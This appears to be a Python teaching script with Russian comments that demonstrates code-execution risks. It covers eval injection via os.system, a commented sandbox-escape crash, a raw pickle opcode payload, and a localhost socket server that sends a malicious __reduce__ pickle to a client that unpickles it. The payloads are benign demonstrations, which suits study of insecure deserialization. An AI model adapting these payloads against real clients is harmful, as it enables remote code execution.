eval("__import__('os').system('echo evil_eval BU-ga-ga')")

# eval("__import__('os').system('echo evil_eval coming again')", {'__builtins__':{}})

# Будьте аккуратны, код ниже приведет к некорректному завершению работы интерпретатора
# s = """ (lambda fc=(
#         lambda n: [
#             c for c in
#                 ().__class__.__bases__[0].__subclasses__()
#                 if c.__name__ == n
#             ][0]
#         ):
#         fc("function")(
#             fc("code")(
#                 0,0,0,0,0,b"BO00OM",(),(),(),"","",0,b""
#             ),{}
#         )()
#     )() """
# eval(s, {'__builtins__':{}})

import pickle

pickle.loads(b"cos\nsystem\n(S'echo I am Evil Pickle-module!'\ntR.")

# -------- Сервер, передающий pickle-объект по сети ------------
import subprocess
import socket


class EvilPayload:
    """ Функция __reduce__ будет выполнена при распаковке объекта
    """

    def __reduce__(self):
        """ Запустим на машине клиента безобидный Notepad (или другой редактор)
        """
        import os
        os.system("echo You've been hacked by Evil Pickle!!! > evil_msg.txt")
        return (subprocess.Popen, (('notepad', 'evil_msg.txt'),))


# Реализуем простой сокет-сервер для демонстрации примера.
# Клиентское приложение находится в файле evil_pickle_client.py
def evil_server():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.bind(("localhost", 9999))
    print('Зловещий сервер запущен...')
    sock.listen()
    conn, addr = sock.accept()

    print('К нам попался клиент', addr)
    print('Отправляем ему "троянца"...')
    # Отсылаем опасный объект "доверчивому" клиенту
    conn.send(pickle.dumps(EvilPayload()))


evil_server()

# --- Простой сокет-клиент для демонстрации работы с pickle-данными -------
import pickle
import socket

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(("localhost", 9999))

# Получаем опасное сообщение
message = sock.recv(1024)
# Распаковываем, "радуемся" - нас взломали...
pickle.loads(message)
sock.close()

